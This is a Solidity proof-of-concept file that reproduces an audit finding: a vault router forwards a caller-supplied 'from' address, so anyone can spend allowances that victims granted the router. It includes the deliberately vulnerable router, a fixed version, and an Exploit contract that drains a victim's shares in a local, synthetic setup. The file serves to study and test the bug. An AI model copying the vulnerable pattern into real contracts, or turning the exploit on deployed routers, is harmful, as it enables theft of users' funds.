// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Omo — OmoRouter.transferFrom spends another user's allowance
    (Pashov Audit Group, H-02). SYNTHETIC, cheatcode-free.
    The router forwards a caller-supplied `from` into the vault.
    The vault spends allowance[from][router]. A victim who approved the
    router so they could move their own shares can have those shares taken.
    This is not the separate "anyone can redeem" finding. */

interface IOmoVault {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IVaultFactory {
    function getVault(uint256 vaultId) external view returns (address);
}

contract OmoVault is IOmoVault {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract VaultFactory is IVaultFactory {
    address public vault;

    constructor(address v) {
        vault = v;
    }

    function getVault(uint256) external view returns (address) {
        return vault;
    }
}

contract OmoRouter {
    IVaultFactory public vaultFactory;

    constructor(address factory) {
        vaultFactory = IVaultFactory(factory);
    }

    function transferFrom(uint256 vaultId, address from, address to, uint256 amount) external returns (bool) {
        address vault = vaultFactory.getVault(vaultId);
        // @> VULN: `from` is caller-supplied, so the router's allowance spends the victim
        return IOmoVault(vault).transferFrom(from, to, amount);
    }
}

contract OmoRouterFixed {
    IVaultFactory public vaultFactory;

    constructor(address factory) {
        vaultFactory = IVaultFactory(factory);
    }

    function transferFrom(uint256 vaultId, address to, uint256 amount) external returns (bool) {
        address vault = vaultFactory.getVault(vaultId);
        // FIX: only the caller's own shares can be spent
        return IOmoVault(vault).transferFrom(msg.sender, to, amount);
    }
}

contract Victim {
    function approve(OmoVault vault, address router, uint256 amount) external {
        vault.approve(router, amount);
    }
}

contract Exploit {
    uint256 public constant STOLEN = 1000;

    OmoVault public vault; // CREATE nonce 1
    VaultFactory public factory; // CREATE nonce 2
    OmoRouter public router; // CREATE nonce 3
    Victim public victim; // CREATE nonce 4

    uint256 public taken;

    constructor() {
        vault = new OmoVault();
        factory = new VaultFactory(address(vault));
        router = new OmoRouter(address(factory));
        victim = new Victim();
    }

    function run() external {
        vault.mint(address(victim), STOLEN);
        victim.approve(vault, address(router), STOLEN);
        router.transferFrom(1, address(victim), msg.sender, STOLEN);
        taken = vault.balanceOf(msg.sender);
        uint256 left = vault.balanceOf(address(victim));
        require(taken == STOLEN, "attacker did not receive the shares");
        require(left == 0, "victim still holds shares");
        require(vault.allowance(address(victim), address(router)) == 0, "allowance not spent");
    }
}
